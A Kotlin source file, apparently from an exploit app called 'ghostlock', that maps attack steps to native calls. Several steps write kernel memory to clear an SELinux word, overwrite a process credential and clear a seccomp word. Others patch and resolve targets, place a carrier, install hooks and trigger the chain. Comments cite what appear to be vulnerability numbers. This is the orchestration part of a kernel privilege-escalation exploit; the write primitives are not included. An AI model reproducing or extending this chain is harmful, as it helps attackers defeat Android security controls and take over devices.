package com.ghostlock.app.core.steps

/**
 * 一步要做的事，翻译成原生调用序列。
 *
 * 每个步骤只在这里出现一次：引擎不认步骤语义，步骤不认执行顺序 —— 两件事各自一处，各自可测。
 * 输入缺哪个就**指名**说缺哪个（Missing(input)），而不是猜一个值，也不是笼统地说输入不全：
 * 理由要能直接告诉人还差什么。
 */
object StepPlans {
    /** 一次原生调用的形状。 */
    data class Call(
        val opName: String,
        val values: Map<String, ULong> = emptyMap(),
        val blobs: Map<String, ByteArray> = emptyMap(),
    )

    /** 一步的翻译结果：要么是一串调用，要么指名缺了哪个输入。 */
    sealed interface StepPlan {
        /** 可以跑：至少一次调用。 */
        data class Ready(val calls: List<Call>) : StepPlan

        /** 缺输入：名字进 precondition 理由。 */
        data class Missing(val input: String) : StepPlan
    }

    /**
     * 翻译一步。
     *
     * @return Ready（调用序列）或 Missing（缺的输入名）。
     */
    fun forStep(step: StepId, inputs: StepInputs): StepPlan = when (step) {
        /* 43499：三个步骤都是"一次 8 字节写"，差别在落字形状、目标地址与值；形状用线上编号传 */
        /* （1 保留清零 / 2 叶子清零 / 3 写值保留）。地址是运行期才知道的（画像只给镜像偏移）， */
        /* 因此没有地址时该步指名拒绝，而不是拿占位地址去动内核。 */
        StepId.W1 -> {
            val address = inputs.selinuxAddress
            if (address == null) {
                StepPlan.Missing("address")
            } else {
                StepPlan.Ready(
                    listOf(
                        Call(
                            "write_word",
                            mapOf(
                                "address" to address,
                                "form" to 1uL,
                                "offset" to inputs.writeOffset,
                            ),
                        ),
                    ),
                )
            }
        }

        StepId.W2 -> {
            val address = inputs.credentialAddress
            val value = inputs.credentialValue
            if (address == null || value == null) {
                StepPlan.Missing("credential")
            } else {
                StepPlan.Ready(
                    listOf(
                        Call(
                            "write_word",
                            mapOf(
                                "address" to address,
                                "value" to value,
                                "form" to 3uL,
                                "offset" to inputs.writeOffset,
                            ),
                        ),
                    ),
                )
            }
        }

        StepId.W3 -> {
            val address = inputs.seccompAddress
            if (address == null) {
                StepPlan.Missing("address")
            } else {
                StepPlan.Ready(
                    listOf(
                        Call(
                            "write_word",
                            mapOf(
                                "address" to address,
                                "form" to 2uL,
                                "offset" to inputs.writeOffset,
                            ),
                        ),
                    ),
                )
            }
        }

        /* 43284：先解析目标（门），再动内容。解析不成 ⇒ 该步拒绝，后面的调用不发出。 */
        StepId.Patch1 -> {
            val path = inputs.patch1Path
            if (path == null) {
                StepPlan.Missing("path")
            } else {
                StepPlan.Ready(
                    listOf(
                        Call("resolve_target", mapOf("mode" to 1uL), mapOf("path" to path)),
                        Call("embedded_image", mapOf("mode" to 0uL)),
                    ),
                )
            }
        }

        StepId.Carrier -> {
            val path = inputs.carrierPath
            if (path == null) {
                StepPlan.Missing("path")
            } else {
                StepPlan.Ready(
                    listOf(
                        Call("resolve_target", mapOf("mode" to 2uL), mapOf("path" to path)),
                    ),
                )
            }
        }

        StepId.Hook -> {
            val path = inputs.hookPath
            if (path == null) {
                StepPlan.Missing("path")
            } else {
                StepPlan.Ready(
                    listOf(
                        /* 先算计划（这一步在设备上已经能答），再去解析目标 —— 后一个调用需要门， */
                        /* 未接线时会以 op-not-wired 具名拒绝。 */
                        Call("hook_words"),
                        Call("resolve_target", mapOf("mode" to 3uL), mapOf("path" to path)),
                    ),
                )
            }
        }

        StepId.Trigger -> {
            val delay = inputs.triggerDelayMs
            if (delay == null) {
                StepPlan.Missing("delay")
            } else {
                StepPlan.Ready(listOf(Call("trigger", mapOf("delay_ms" to delay))))
            }
        }

        StepId.Wait -> {
            val budget = inputs.waitBudgetMs
            val poll = inputs.waitPollMs
            if (budget == null || poll == null) {
                StepPlan.Missing("budget")
            } else {
                val blobs = inputs.moduleName?.let { mapOf("text" to it) } ?: emptyMap()
                StepPlan.Ready(
                    listOf(Call("wait_terminal", mapOf("mode" to budget, "poll_ms" to poll), blobs)),
                )
            }
        }
    }
}
